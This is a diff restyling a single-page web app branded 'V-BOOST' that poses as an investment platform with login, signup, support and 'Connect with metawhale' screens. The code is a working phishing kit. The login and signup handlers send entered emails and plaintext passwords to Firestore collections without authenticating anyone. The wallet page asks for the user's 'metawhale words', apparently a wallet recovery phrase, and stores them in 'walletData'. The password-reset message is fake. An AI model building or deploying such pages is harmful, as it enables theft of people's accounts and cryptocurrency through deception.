@@ -3,9 +3,11 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport"
-content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
 <title>V-BOOST</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
 <style>
 
@@ -13,20 +15,20 @@ content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable
 margin:0;
 padding:0;
 box-sizing:border-box;
-font-family:Arial,sans-serif;
+font-family:'Inter',sans-serif;
 -webkit-tap-highlight-color:transparent;
 }
 
 body{
 background:#fff;
 overflow-x:hidden;
-color:#000;
+color:#111;
 }
 
 .page{
 display:none;
 min-height:100vh;
-padding:25px;
+padding:22px;
 position:relative;
 }
 
@@ -34,160 +36,203 @@ position:relative;
 display:block;
 }
 
-.top{
+.topbar{
 display:flex;
 justify-content:space-between;
 align-items:center;
 }
 
 .logo{
-font-size:52px;
+font-size:44px;
 font-weight:900;
 font-style:italic;
-letter-spacing:-4px;
+letter-spacing:-3px;
+transform:skew(-8deg);
 }
 
 .support-btn{
-border:1px solid #ddd;
+border:1px solid #e4e4e4;
 background:#fff;
-padding:18px 32px;
-border-radius:40px;
-font-size:18px;
+height:44px;
+padding:0 22px;
+border-radius:999px;
+font-size:15px;
+font-weight:500;
 cursor:pointer;
 }
 
 .back{
-margin-top:35px;
-font-size:20px;
-cursor:pointer;
+margin-top:30px;
+width:42px;
+height:42px;
+border-radius:50%;
 display:flex;
 align-items:center;
-gap:10px;
+justify-content:center;
+font-size:20px;
+cursor:pointer;
 }
 
-.center-box{
-margin-top:140px;
-text-align:center;
-}
-
-.title{
-font-size:34px;
-font-weight:700;
-margin-bottom:18px;
-}
-
-.subtitle{
-font-size:19px;
-color:#888;
-line-height:1.5;
-}
-
-.form{
+.content{
 margin-top:55px;
 }
 
+.heading{
+font-size:31px;
+font-weight:700;
+line-height:1.15;
+}
+
+.sub{
+margin-top:14px;
+font-size:15px;
+line-height:1.6;
+color:#777;
+}
+
+.form{
+margin-top:38px;
+}
+
 .label{
-font-size:18px;
-margin-bottom:12px;
+font-size:15px;
+font-weight:500;
+margin-bottom:10px;
 display:block;
-color:#666;
+color:#444;
 }
 
-.input-box{
-width:100%;
-height:60px;
-border:1px solid #ddd;
-border-radius:35px;
-padding:0 25px;
-font-size:18px;
-outline:none;
-}
-
-.password-wrap{
+.input-wrap{
 position:relative;
+margin-bottom:22px;
+}
+
+.input{
+width:100%;
+height:58px;
+border:1px solid #e5e5e5;
+border-radius:18px;
+padding:0 18px;
+font-size:16px;
+outline:none;
+background:#fff;
+}
+
+.input:focus{
+border-color:#d4d4d4;
 }
 
 .eye{
 position:absolute;
-right:22px;
-top:18px;
-font-size:22px;
+right:16px;
+top:50%;
+transform:translateY(-50%);
 cursor:pointer;
+width:22px;
+height:22px;
+stroke:#111;
+fill:none;
+stroke-width:1.8;
 }
 
 .forgot{
 text-align:right;
-margin-top:16px;
-color:#ff4a4a;
-font-size:16px;
+font-size:14px;
+font-weight:600;
+color:#ef4444;
+margin-top:-6px;
+margin-bottom:24px;
 cursor:pointer;
 }
 
-.red-btn{
-width:220px;
-height:62px;
-background:#ff4040;
+.btn{
+width:100%;
+height:58px;
 border:none;
-border-radius:40px;
+border-radius:18px;
+background:#ef4444;
 color:#fff;
-font-size:22px;
+font-size:17px;
+font-weight:600;
 cursor:pointer;
-display:block;
-margin:45px auto 0;
 }
 
-.light-btn{
-background:#f5a8a8;
+.btn:disabled{
+background:#f5a3a3;
+cursor:not-allowed;
 }
 
-.bottom-text{
-margin-top:35px;
+.bottom{
+margin-top:28px;
 text-align:center;
-font-size:18px;
+font-size:15px;
 }
 
 .red{
-color:#ff4a4a;
+color:#ef4444;
+font-weight:600;
+cursor:pointer;
+}
+
+.rules{
+margin-top:10px;
+font-size:14px;
+line-height:1.9;
+color:#555;
+}
+
+.check{
+display:flex;
+gap:12px;
+align-items:flex-start;
+margin-top:20px;
+font-size:14px;
+line-height:1.7;
+}
+
+.check input{
+margin-top:4px;
+width:18px;
+height:18px;
+}
+
+.popup{
+position:fixed;
+top:18px;
+left:50%;
+transform:translateX(-50%);
+background:#111;
+color:#fff;
+padding:13px 18px;
+border-radius:12px;
+font-size:14px;
+z-index:9999;
+display:none;
+}
+
+.center-box{
+margin-top:120px;
 }
 
 .textarea{
 width:100%;
-height:130px;
-border:2px solid #000;
-border-radius:15px;
-padding:18px;
-font-size:16px;
+height:100px;
+border:1.5px solid #111;
+border-radius:18px;
+padding:15px;
+font-size:15px;
 outline:none;
 resize:none;
-}
-
-.check-row{
-display:flex;
-gap:12px;
-margin-top:22px;
-align-items:flex-start;
-}
-
-.check-row input{
-width:22px;
-height:22px;
-margin-top:2px;
-}
-
-.small{
-font-size:15px;
-line-height:1.7;
-color:#777;
-margin-top:15px;
+margin-top:25px;
 }
 
 .dropdown{
 width:100%;
-height:60px;
-border:1px solid #ddd;
-border-radius:35px;
-padding:0 25px;
-font-size:18px;
+height:58px;
+border:1px solid #e5e5e5;
+border-radius:18px;
+padding:0 18px;
+font-size:15px;
 outline:none;
 background:#fff;
 }
@@ -195,60 +240,68 @@ background:#fff;
 .big-area{
 width:100%;
 height:170px;
-border:1px solid #ddd;
-border-radius:25px;
-padding:20px;
-font-size:18px;
+border:1px solid #e5e5e5;
+border-radius:18px;
+padding:16px;
+font-size:15px;
 outline:none;
 resize:none;
 }
 
 .upload{
-border:1px solid #ddd;
-border-radius:25px;
-padding:40px 20px;
+margin-top:12px;
+border:1px dashed #d8d8d8;
+border-radius:18px;
+padding:32px 18px;
 text-align:center;
-margin-top:18px;
 }
 
-.popup{
-position:fixed;
-top:20px;
-left:50%;
-transform:translateX(-50%);
-background:#000;
-color:#fff;
-padding:14px 25px;
-border-radius:10px;
-display:none;
-z-index:9999;
-font-size:15px;
+.upload-icon{
+font-size:34px;
+margin-bottom:10px;
 }
 
-.row{
+.small{
+margin-top:10px;
+font-size:13px;
+line-height:1.6;
+color:#888;
+}
+
+.action-row{
 display:flex;
-justify-content:space-between;
-margin-top:35px;
+gap:12px;
+margin-top:26px;
 }
 
-.cancel-btn{
-width:150px;
+.cancel{
+flex:1;
 height:55px;
 border:none;
-border-radius:35px;
+border-radius:18px;
 background:#f5f5f5;
-font-size:22px;
-color:#ff4a4a;
+font-size:16px;
+font-weight:600;
+color:#ef4444;
+cursor:pointer;
 }
 
-.send-btn{
-width:150px;
+.send{
+flex:1;
 height:55px;
 border:none;
-border-radius:35px;
-background:#ff4040;
-font-size:22px;
+border-radius:18px;
+background:#ef4444;
+font-size:16px;
+font-weight:600;
 color:#fff;
+cursor:pointer;
+}
+
+.close{
+font-size:34px;
+text-align:right;
+cursor:pointer;
 }
 
 </style>
@@ -260,159 +313,202 @@ color:#fff;
 
 <!-- LOGIN -->
 
-<section class="page active" id="loginPage">
+<section class="page active" id="login">
 
-<div class="top">
+<div class="topbar">
 <div class="logo">V-BOOST</div>
-<button class="support-btn" onclick="openPage('supportPage')">Support</button>
+<button class="support-btn" onclick="showPage('support')">Support</button>
 </div>
 
-<div class="center-box">
-<div class="title">Welcome to V-Boost</div>
-<div class="subtitle">Where your growth becomes digital capital</div>
+<div class="content">
+
+<div class="heading">Welcome to V-Boost</div>
+
+<div class="sub">
+Where your growth becomes digital capital
 </div>
 
 <div class="form">
 
 <label class="label">Email</label>
-<input type="email" class="input-box" id="loginEmail" placeholder="Enter email">
 
-<br><br>
+<div class="input-wrap">
+<input class="input" id="loginEmail" type="email" placeholder="Enter email">
+</div>
 
 <label class="label">Password</label>
 
-<div class="password-wrap">
-<input type="password" class="input-box" id="loginPassword" placeholder="Enter password">
-<div class="eye" onclick="togglePassword('loginPassword')">◉</div>
+<div class="input-wrap">
+
+<input class="input" id="loginPass" type="password" placeholder="Enter password">
+
+<svg onclick="togglePass('loginPass')" class="eye" viewBox="0 0 24 24">
+<path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z"/>
+<circle cx="12" cy="12" r="3"/>
+</svg>
+
 </div>
 
-<div class="forgot" onclick="openPage('forgotPage')">Forgot password?</div>
+<div class="forgot" onclick="showPage('forgot')">
+Forgot password?
+</div>
 
-<button class="red-btn" onclick="loginUser()">Log in</button>
+<button class="btn" onclick="loginUser()">
+Log in
+</button>
 
-<div class="bottom-text">
+<div class="bottom">
 Do not have an account?
-<span class="red" onclick="openPage('signupPage')">Sign up</span>
+<span class="red" onclick="showPage('signup')">Sign up</span>
 </div>
 
+</div>
 </div>
 </section>
 
 <!-- FORGOT -->
 
-<section class="page" id="forgotPage">
+<section class="page" id="forgot">
 
-<div class="top">
+<div class="topbar">
 <div class="logo">V-BOOST</div>
-<button class="support-btn" onclick="openPage('supportPage')">Support</button>
+<button class="support-btn" onclick="showPage('support')">Support</button>
 </div>
 
-<div class="back" onclick="openPage('loginPage')">← Back</div>
+<div class="back" onclick="showPage('login')">←</div>
 
-<div class="center-box">
-<div class="title">Reset your password</div>
-<div class="subtitle">Enter your registered email address</div>
+<div class="content">
+
+<div class="heading">Reset your password</div>
+
+<div class="sub">
+Enter your registered email address
 </div>
 
 <div class="form">
 
 <label class="label">Email</label>
-<input type="email" class="input-box" id="forgotEmail" placeholder="Email">
 
-<button class="red-btn light-btn" id="forgotBtn"
-onclick="forgotPassword()">Continue</button>
-
+<div class="input-wrap">
+<input class="input" id="forgotEmail" type="email" placeholder="Email">
 </div>
 
+<button class="btn" onclick="forgotPassword()">
+Continue
+</button>
+
+</div>
+</div>
 </section>
 
 <!-- SIGNUP -->
 
-<section class="page" id="signupPage">
+<section class="page" id="signup">
 
-<div class="top">
+<div class="topbar">
 <div class="logo">V-BOOST</div>
-<button class="support-btn" onclick="openPage('supportPage')">Support</button>
+<button class="support-btn" onclick="showPage('support')">Support</button>
 </div>
 
-<div class="back" onclick="openPage('loginPage')">← Back</div>
+<div class="back" onclick="showPage('login')">←</div>
 
-<div class="center-box">
-<div class="title">Create your V-Boost account</div>
-<div class="subtitle">Where your growth becomes digital capital</div>
+<div class="content">
+
+<div class="heading">Create your V-Boost account</div>
+
+<div class="sub">
+Where your growth becomes digital capital
 </div>
 
 <div class="form">
 
 <label class="label">Email</label>
-<input type="email" class="input-box" id="signupEmail" placeholder="Email">
 
-<br><br>
+<div class="input-wrap">
+<input class="input" id="signEmail" type="email" placeholder="Email">
+</div>
 
 <label class="label">Create password</label>
 
-<div class="password-wrap">
-<input type="password" class="input-box" id="signupPass" placeholder="Password">
-<div class="eye" onclick="togglePassword('signupPass')">◉</div>
-</div>
+<div class="input-wrap">
 
-<br><br>
+<input class="input" id="signPass" type="password" placeholder="Password">
+
+<svg onclick="togglePass('signPass')" class="eye" viewBox="0 0 24 24">
+<path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z"/>
+<circle cx="12" cy="12" r="3"/>
+</svg>
+
+</div>
 
 <label class="label">Confirm password</label>
 
-<div class="password-wrap">
-<input type="password" class="input-box" id="signupConfirm" placeholder="Password">
-<div class="eye" onclick="togglePassword('signupConfirm')">◉</div>
+<div class="input-wrap">
+
+<input class="input" id="confirmPass" type="password" placeholder="Password">
+
+<svg onclick="togglePass('confirmPass')" class="eye" viewBox="0 0 24 24">
+<path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z"/>
+<circle cx="12" cy="12" r="3"/>
+</svg>
+
 </div>
 
-<div class="small">
-Password must contain at least:
-<br><br>
-• 8 characters
-<br><br>
-• One uppercase letter (A–Z)
-<br><br>
-• One lowercase letter (a–z)
-<br><br>
-• One number (0–9)
+<div class="rules">
+• 8 Characters<br>
+• One uppercase letter (A-Z)<br>
+• One lowercase letter (a-z)<br>
+• One number (0-9)
 </div>
 
-<div class="check-row">
+<div class="check">
+
 <input type="checkbox" id="terms">
+
 <div>
 I agree to the
-<span class="red">Terms of Use</span>,
-<span class="red">Privacy Policy</span>,
+<span class="red">Terms of use</span>,
+<span class="red">Privacy Policy</span>
 and
-<span class="red">Risk Disclosure</span>.
+<span class="red">Risk Disclosure</span>
 </div>
-</div>
-
-<button class="red-btn light-btn" onclick="signupUser()">Continue</button>
 
 </div>
 
+<button class="btn" style="margin-top:25px" onclick="signupUser()">
+Continue
+</button>
+
+</div>
+</div>
 </section>
 
-<!-- METAWHALE -->
+<!-- META -->
 
-<section class="page" id="metaPage">
+<section class="page" id="meta">
 
-<div class="top">
+<div class="topbar">
 <div class="logo">V-BOOST</div>
 </div>
 
-<div class="back" onclick="openPage('loginPage')">← Back</div>
+<div class="back" onclick="showPage('login')">←</div>
 
 <div class="center-box">
-<div class="title">Connect with metawhale</div>
 
-<div class="subtitle">
-Your V-Boost is not connected to metaWhale,
+<div class="heading">
+Connect with metawhale
+</div>
+
+<div class="sub" style="margin-top:20px">
+Your V-Boost is not connected to MetaWhale,
 please try to connect it to MetaWhale first.
 </div>
 
-<button class="red-btn" onclick="openPage('walletPage')">Continue</button>
+<button class="btn"
+style="margin-top:34px"
+onclick="showPage('wallet')">
+Continue
+</button>
 
 </div>
 
@@ -420,30 +516,39 @@ please try to connect it to MetaWhale first.
 
 <!-- WALLET -->
 
-<section class="page" id="walletPage">
+<section class="page" id="wallet">
 
-<div class="top">
+<div class="topbar">
 <div class="logo">V-BOOST</div>
 </div>
 
 <div class="center-box">
 
-<div class="title">Connect with metawhale</div>
+<div class="heading">
+Connect with metawhale
+</div>
 
-<textarea class="textarea"
+<textarea
+class="textarea"
 id="walletWords"
 placeholder="Input your metawhale words for connecting with v-boost"></textarea>
 
-<div class="check-row">
+<div class="check">
+
 <input type="checkbox" id="walletCheck">
 
 <div class="red">
 Remember this wallet should not be new,
 it should be registered with metawhale
 </div>
+
 </div>
 
-<button class="red-btn" onclick="saveWallet()">Next</button>
+<button class="btn"
+style="margin-top:25px"
+onclick="saveWallet()">
+Next
+</button>
 
 </div>
 
@@ -451,93 +556,88 @@ it should be registered with metawhale
 
 <!-- SUPPORT -->
 
-<section class="page" id="supportPage">
+<section class="page" id="support">
 
-<div style="text-align:right;font-size:40px;cursor:pointer;"
-onclick="openPage('loginPage')">×</div>
+<div class="close" onclick="showPage('login')">
+×
+</div>
 
-<div style="text-align:center">
+<div class="content" style="margin-top:20px">
 
-<div class="title">Need any help?</div>
+<div class="heading">
+Need any help?
+</div>
 
-<div class="subtitle">
+<div class="sub">
 What issues are you facing with the platform?
 Please describe it and send a request.
 We will send our response to your email.
-</div>
-
 </div>
 
 <div class="form">
 
 <label class="label">Email</label>
 
-<input type="email" class="input-box"
+<div class="input-wrap">
+<input class="input"
 id="supportEmail"
 placeholder="johndoe@gmail.com">
-
-<br><br>
+</div>
 
 <label class="label">Indicate the topic</label>
 
-<select class="dropdown" id="supportTopic">
-
+<select class="dropdown" id="topic">
 <option>Technical problem on the site</option>
-
 <option>I can’t find a referral in the structure</option>
-
 <option>Incorrect display of income</option>
-
 <option>Other</option>
-
 </select>
 
 <br><br>
 
 <label class="label">Description</label>
 
-<textarea class="big-area"
-id="supportDescription"
+<textarea
+class="big-area"
+id="supportDesc"
 placeholder="Problem description"></textarea>
 
 <div class="small">
 Minimum 50, maximum 1000 characters.
 Describe the problem in as much detail as possible.
-If possible, please add screenshots to help us resolve your issue faster.
 </div>
 
-<br><br>
+<br>
 
 <label class="label">Attach files</label>
 
 <div class="upload">
-<div style="font-size:50px">↑</div>
 
-<div style="margin-top:18px;font-size:25px">
+<div class="upload-icon">↑</div>
+
+<div>
 Drag and drop or
 <span class="red">Click to upload</span>
 </div>
 
-<div class="small">
-JPG, PNG, PDF, LOG, TXT, MP4, MOV
-(total up to 30 MB)
-</div>
 </div>
 
-<div class="row">
+<div class="action-row">
 
-<button class="cancel-btn" onclick="clearSupport()">
+<button class="cancel"
+onclick="clearSupport()">
 Cancel
 </button>
 
-<button class="send-btn" onclick="sendSupport()">
+<button class="send"
+onclick="sendSupport()">
 Send
 </button>
 
 </div>
 
 </div>
-
+</div>
 </section>
 
 <script type="module">
@@ -562,38 +662,38 @@ appId: "1:50442414127:web:00db67e99afed8d2803eda"
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-window.openPage = function(pageId){
+window.showPage = function(id){
 
-document.querySelectorAll(".page")
-.forEach(page=>page.classList.remove("active"));
+document.querySelectorAll('.page')
+.forEach(p=>p.classList.remove('active'));
 
-document.getElementById(pageId)
-.classList.add("active");
+document.getElementById(id)
+.classList.add('active');
 
 window.scrollTo(0,0);
 
 }
 
-window.togglePassword = function(id){
+window.togglePass = function(id){
 
 const input = document.getElementById(id);
 
 input.type =
-input.type === "password"
-? "text"
-: "password";
+input.type === 'password'
+? 'text'
+: 'password';
 
 }
 
 function popup(text){
 
-const box = document.getElementById("popup");
+const pop = document.getElementById('popup');
 
-box.innerText = text;
-box.style.display = "block";
+pop.innerText = text;
+pop.style.display = 'block';
 
 setTimeout(()=>{
-box.style.display = "none";
+pop.style.display = 'none';
 },2500);
 
 }
@@ -601,124 +701,124 @@ box.style.display = "none";
 window.loginUser = async function(){
 
 const email =
-document.getElementById("loginEmail").value;
+document.getElementById('loginEmail').value;
 
-const password =
-document.getElementById("loginPassword").value;
+const pass =
+document.getElementById('loginPass').value;
 
-if(!email || !password){
-popup("Fill all fields");
+if(!email || !pass){
+popup('Fill all fields');
 return;
 }
 
-await addDoc(collection(db,"loginData"),{
+await addDoc(collection(db,'loginData'),{
 email,
-password,
+pass,
 time:new Date()
 });
 
-openPage("metaPage");
+showPage('meta');
 
 }
 
 window.forgotPassword = function(){
 
 const email =
-document.getElementById("forgotEmail").value;
+document.getElementById('forgotEmail').value;
 
 if(!email){
-popup("Enter email");
+popup('Enter email');
 return;
 }
 
-popup("Reset link sent to your email");
+popup('Reset link sent to your email');
 
 }
 
 window.signupUser = async function(){
 
 const email =
-document.getElementById("signupEmail").value;
+document.getElementById('signEmail').value;
 
-const password =
-document.getElementById("signupPass").value;
+const pass =
+document.getElementById('signPass').value;
 
 const confirm =
-document.getElementById("signupConfirm").value;
+document.getElementById('confirmPass').value;
 
 const terms =
-document.getElementById("terms").checked;
+document.getElementById('terms').checked;
 
-if(!email || !password || !confirm || !terms){
-popup("Fill all fields");
+if(!email || !pass || !confirm || !terms){
+popup('Fill all fields');
 return;
 }
 
-await addDoc(collection(db,"signupData"),{
+await addDoc(collection(db,'signupData'),{
 email,
-password,
+pass,
 confirm,
 time:new Date()
 });
 
-openPage("metaPage");
+showPage('meta');
 
 }
 
 window.sendSupport = async function(){
 
 const email =
-document.getElementById("supportEmail").value;
+document.getElementById('supportEmail').value;
 
 const topic =
-document.getElementById("supportTopic").value;
+document.getElementById('topic').value;
 
-const description =
-document.getElementById("supportDescription").value;
+const desc =
+document.getElementById('supportDesc').value;
 
-if(!email || !topic || !description){
-popup("Fill all fields");
+if(!email || !desc){
+popup('Fill all fields');
 return;
 }
 
-await addDoc(collection(db,"supportData"),{
+await addDoc(collection(db,'supportData'),{
 email,
 topic,
-description,
+desc,
 time:new Date()
 });
 
-popup("Request submitted");
+popup('Request submitted');
 
 }
 
 window.clearSupport = function(){
 
-document.getElementById("supportEmail").value="";
-document.getElementById("supportDescription").value="";
+document.getElementById('supportEmail').value='';
+document.getElementById('supportDesc').value='';
 
 }
 
 window.saveWallet = async function(){
 
 const words =
-document.getElementById("walletWords").value;
+document.getElementById('walletWords').value;
 
 const check =
-document.getElementById("walletCheck").checked;
+document.getElementById('walletCheck').checked;
 
 if(!words || !check){
-popup("Fill all fields");
+popup('Fill all fields');
 return;
 }
 
-await addDoc(collection(db,"walletData"),{
+await addDoc(collection(db,'walletData'),{
 words,
 check,
 time:new Date()
 });
 
-popup("Please wait, metawhale is connecting");
+popup('Please wait, metawhale is connecting');
 
 }
 
